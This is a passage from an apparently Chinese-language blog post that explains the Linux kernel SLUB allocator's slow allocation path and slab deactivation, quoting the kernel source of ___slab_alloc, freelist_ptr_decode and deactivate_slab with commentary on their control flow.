并从其中获取一个空闲对象。</p><p>这里先考虑条件成立的情况那么就会调用<code>get_freepointer_safe</code>获取到当前空闲对象的下一个空闲对象，接下来调用<code>__update_cpu_freelist_fast</code>函数进行检查是否发生了抢占，如果是则跳回redo重新获取<code>kmem_cache_cpu</code>。最后通过<code>prefetch_freepointer</code>将已分配对象的地址载入缓存中，之后返回分配成功的对象。</p><p>前面主要说的是当<code>slab</code>和<code>freelist</code>存在时的情况，下面主要提一下if分支内的内容。这里是直接调用了<code>__slab_alloc</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c, <span class="keyword">unsigned</span> <span class="keyword">int</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We may have been preempted and rescheduled on a different</span></span><br><span class="line"><span class="comment"> * cpu before disabling preemption. Need to reload cpu area</span></span><br><span class="line"><span class="comment"> * pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要是对<code>___slab_alloc</code>函数的wrapper</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *___slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c, <span class="keyword">unsigned</span> <span class="keyword">int</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br><span class="line"></span><br><span class="line">reread_slab:</span><br><span class="line"></span><br><span class="line">slab = READ_ONCE(c-&gt;slab);</span><br><span class="line"><span class="keyword">if</span> (!slab) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment"> * ignore the node constraint</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">     !node_isset(node, slab_nodes)))</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">&#125;</span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!node_match(slab, node))) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment"> * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!node_isset(node, slab_nodes)) &#123;</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By rights, we should be searching for a slab page that was</span></span><br><span class="line"><span class="comment"> * PFMEMALLOC but right now, we are losing the pfmemalloc</span></span><br><span class="line"><span class="comment"> * information when the page leaves the per-cpu allocator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must check again c-&gt;slab in case we got preempted and it changed */</span></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line">freelist = get_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!freelist) &#123;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, DEACTIVATE_BYPASS);</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line">load_freelist:</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment"> * slab is pointing to the slab from which the objects are obtained.</span></span><br><span class="line"><span class="comment"> * That slab must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">VM_BUG_ON(!c-&gt;slab-&gt;frozen);</span><br><span class="line">c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">deactivate_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (slab != c-&gt;slab) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">deactivate_slab(s, slab, freelist);</span><br><span class="line"></span><br><span class="line">new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slub_percpu_partial(c)) &#123;</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="comment">/* we were preempted and partial list got empty */</span></span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab = c-&gt;slab = slub_percpu_partial(c);</span><br><span class="line">slub_set_percpu_partial(c, slab);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_objects:</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">freelist = get_partial(s, node, &amp;pc);</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> check_new_slab;</span><br><span class="line"></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLAB);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) &#123;</span><br><span class="line">freelist = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!freelist))</span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * No other reference to the slab yet so we can</span></span><br><span class="line"><span class="comment"> * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">slab-&gt;inuse = slab-&gt;objects;</span><br><span class="line">slab-&gt;frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);</span><br><span class="line"></span><br><span class="line">check_new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For debug caches here we had to go through</span></span><br><span class="line"><span class="comment"> * alloc_single_from_partial() so just store the tracking info</span></span><br><span class="line"><span class="comment"> * and return the object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span></span><br><span class="line"><span class="comment"> * we don&#x27;t make further mismatched allocations easier.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">deactivate_slab(s, slab, get_freepointer(s, freelist));</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry_load_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) &#123;</span><br><span class="line"><span class="keyword">void</span> *flush_freelist = c-&gt;freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">flush_slab</span> =</span> c-&gt;slab;</span><br><span class="line"></span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">deactivate_slab(s, flush_slab, flush_freelist);</span><br><span class="line"></span><br><span class="line">stat(s, CPUSLAB_FLUSH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> retry_load_slab;</span><br><span class="line">&#125;</span><br><span class="line">c-&gt;slab = slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>___slab_alloc</code>函数才是其核心函数，首先是<code>reread_slab</code>标签中，判断是否存在<code>slab</code>如果不存在则跳转到<code>new_slab</code>。</p><p>在<code>new_slab</code>会检查是否存在<code>percpu partial slab</code>，如果存在则将则将链表中取出一个<code>slab</code>给到<code>percpu slab</code>随后跳进<code>redo</code>。</p><p>在<code>redo</code>标签中，首先判断slab是否和<code>node</code>以及分配标识位匹配，如果不匹配则跳转至<code>deactivate_slab</code>标签，紧接着验证当前的slab是否是原来cpu的slab，如果不是则表示发生了抢占跳转到<code>reread_slab</code>标签中。随后获取<code>freelist</code>若<code>freelist</code>不为空则跳转到<code>load_freelist</code>中，若为空则调用<code>get_freelist</code>函数获取slab的<code>freelist</code>如果仍然为空，则将<code>percpu slab</code>的<code>freelist</code>设置为NULL随后跳转到下一个tid，并重新进入<code>new_slab</code>标签获取<code>slab</code>。</p><p>随后看<code>load_freelist</code>标签，这一段就比较简单理解了，就是将<code>freelist</code>的<code>next</code>指针赋值给<code>percpu freelist</code>，然后获得下一个tid随后返回<code>freelist</code>。可以注意到的是这里使用的是<code>get_freepointer</code>函数，而这个函数最终会调用到<code>freelist_ptr_decode</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr_decode</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">freeptr_t</span> ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *decoded;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">decoded = (<span class="keyword">void</span> *)(ptr.v ^ s-&gt;random ^ swab(ptr_addr));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">decoded = (<span class="keyword">void</span> *)ptr.v;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> decoded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单观察这个函数可以发现即便是开启了<code>Hardened freelist</code>保护的情况下<code>slab-&gt;freelist</code>都是没有加密的，加密的只是对象上的内容。</p><p>回到前面的流程进入到<code>deactivate_slab</code>标签中，这里逻辑很简单，就是将<code>percpu</code>的<code>freelist</code>和<code>slab</code>设置为NULL并且获取到下一个tid之后直接调用<code>deactivate_slab</code>函数，对整张slab进行<code>deactivate</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deactivate_slab</span><span class="params">(struct kmem_cache *s, struct slab *slab,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *freelist)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, slab_nid(slab));</span><br><span class="line"><span class="keyword">int</span> free_delta = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> <span class="title">mode</span> =</span> M_NONE;</span><br><span class="line"><span class="keyword">void</span> *nextfree, *freelist_iter, *freelist_tail;</span><br><span class="line"><span class="keyword">int</span> tail = DEACTIVATE_TO_HEAD;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;freelist) &#123;</span><br><span class="line">stat(s, DEACTIVATE_REMOTE_FREES);</span><br><span class="line">tail = DEACTIVATE_TO_TAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage one: Count the objects on cpu&#x27;s freelist as free_delta and</span></span><br><span class="line"><span class="comment"> * remember the last object in freelist_tail for later splicing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist_tail = <span class="literal">NULL</span>;</span><br><span class="line">freelist_iter = freelist;</span><br><span class="line"><span class="keyword">while</span> (freelist_iter) &#123;</span><br><span class="line">nextfree = get_freepointer(s, freelist_iter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If &#x27;nextfree&#x27; is invalid, it is possible that the object at</span></span><br><span class="line"><span class="comment"> * &#x27;freelist_iter&#x27; is already corrupted.  So isolate all objects</span></span><br><span class="line"><span class="comment"> * starting at &#x27;freelist_iter&#x27; by skipping them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">freelist_tail = freelist_iter;</span><br><span class="line">free_delta++;</span><br><span class="line"></span><br><span class="line">freelist_iter = nextfree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage two: Unfreeze the slab while splicing the per-cpu</span></span><br><span class="line"><span class="comment"> * freelist to the head of slab&#x27;s freelist.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Ensure that the slab is unfrozen while the list presence</span></span><br><span class="line"><span class="comment"> * reflects the actual number of objects during unfreeze.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We first perform cmpxchg holding lock and insert to list</span></span><br><span class="line"><span class="comment"> * when it succeed. If there is mismatch then the slab is not</span></span><br><span class="line"><span class="comment"> * unfrozen and number of objects in the slab may have changed.</span></span><br><span class="line"><span class="comment"> * Then release lock and retry cmpxchg again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">old.freelist = READ_ONCE(slab-&gt;freelist);</span><br><span class="line">old.counters = READ_ONCE(slab-&gt;counters);</span><br><span class="line">VM_BUG_ON(!old.frozen);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Determine target state of the slab */</span></span><br><span class="line"><span class="keyword">new</span>.counters = old.counters;</span><br><span class="line"><span class="keyword">if</span> (freelist_tail) &#123;</span><br><span class="line"><span class="keyword">new</span>.inuse -= free_delta;</span><br><span class="line">set_freepointer(s, freelist_tail, old.freelist);</span><br><span class="line"><span class="keyword">new</span>.freelist = freelist;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">new</span>.freelist = old.freelist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>.frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;</span><br><span class="line">mode = M_FREE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">new</span>.freelist) &#123;</span><br><span class="line">mode = M_PARTIAL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Taking the spinlock removes the possibility that</span></span><br><span class="line"><span class="comment"> * acquire_slab() will see a slab that is frozen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mode = M_FULL_NOLIST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!slab_update_freelist(s, slab,</span><br><span class="line">old.freelist, old.counters,</span><br><span class="line"><span class="keyword">new</span>.freelist, <span class="keyword">new</span>.counters,</span><br><span class="line"><span class="string">&quot;unfreezing slab&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL)</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span 